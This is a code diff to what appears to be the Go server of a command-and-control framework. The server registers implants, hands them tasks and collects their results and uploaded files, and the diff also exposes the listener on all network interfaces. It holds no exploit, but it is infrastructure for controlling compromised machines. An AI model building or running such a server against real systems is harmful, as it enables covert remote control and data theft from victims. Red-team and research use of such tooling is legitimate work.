@@ -34,12 +34,12 @@ func logRequest(handler http.Handler) http.Handler {
 func requestHandler(w http.ResponseWriter, r *http.Request) {
 	var req Request
 	contentType := r.Header.Get("Content-Type")
-
 	if contentType == "application/json" {
 		// Parse JSON request
 		err := json.NewDecoder(r.Body).Decode(&req)
 		if err != nil {
 			http.Error(w, err.Error(), http.StatusBadRequest)
+			comunication.Logger.Debugf("Request: %v", req)
 			comunication.Logger.Errorf("failed to decode JSON request: %v", err)
 			return
 		}
@@ -87,12 +87,17 @@ func requestHandler(w http.ResponseWriter, r *http.Request) {
 // Handle ImplantInfo request
 func handleInsertImplantInfo(w http.ResponseWriter, content json.RawMessage) {
 	var implant *db.ImplantInfo
+	// comunication.Logger.Infof("Implant Info: %s", string(content))
 	err := json.Unmarshal(content, &implant)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusBadRequest)
 		comunication.Logger.Errorf("failed to decode implant info: %v", err)
 		return
 	}
+
+	implant.LastCheckIn = comunication.CurrentUnixTimestamp()
+	implant.Active = true
+	implant.KillDate = 0
 
 	err = db.AddImplant(implant)
 	if errors.Is(err, comunication.ErrImplantExists) {
@@ -137,6 +142,11 @@ func handleGetTasksByImplantID(w http.ResponseWriter, content json.RawMessage) {
 
 	tasks, err := db.GetImplantTasks(data.ID, data.Completed)
 	if err != nil {
+		if errors.Is(err, comunication.ErrNoResults) {
+			http.Error(w, "no tasks need to be done", http.StatusNotFound)
+			comunication.Logger.Warnf("no tasks found for implant ID: %v", data.ID)
+			return
+		}
 		http.Error(w, err.Error(), http.StatusInternalServerError)
 		comunication.Logger.Warnf("failed to get tasks by implant ID: %v", data.ID)
 		return
@@ -182,6 +192,22 @@ func handleUploadTaskResults(w http.ResponseWriter, r *http.Request, content jso
 		comunication.Logger.Errorf("failed to check task existence: %v", err)
 		return
 	}
+	// check if the implant returns a with a status as error and the output is the error string instead
+	if data.Result.Status == "error" {
+		output, ok := data.Result.Output.(string)
+		if !ok {
+			http.Error(w, "invalid output type", http.StatusBadRequest)
+			return
+		}
+		taskResult := []byte(output)
+		err = db.CompleteTask(data.TaskID, taskResult)
+		if err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			comunication.Logger.Errorf("failed to complete task: %v", err)
+			return
+		}
+	}
+
 	switch output := data.Result.Output.(type) {
 	case string:
 		// Handle short output
@@ -286,6 +312,7 @@ func handleUploadTaskResults(w http.ResponseWriter, r *http.Request, content jso
 			comunication.Logger.Errorf("failed to complete task with file: %v", err)
 			return
 		}
+
 	default:
 		http.Error(w, "invalid output type", http.StatusBadRequest)
 		return
@@ -322,7 +349,7 @@ func StartExtHTTPServer() {
 	r.HandleFunc("/request", requestHandler).Methods("POST")
 
 	srv := &http.Server{
-		Addr:         "localhost:8443",
+		Addr:         "0.0.0.0:8443",
 		Handler:      r,
 		TLSConfig:    tlsConfig,
 		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
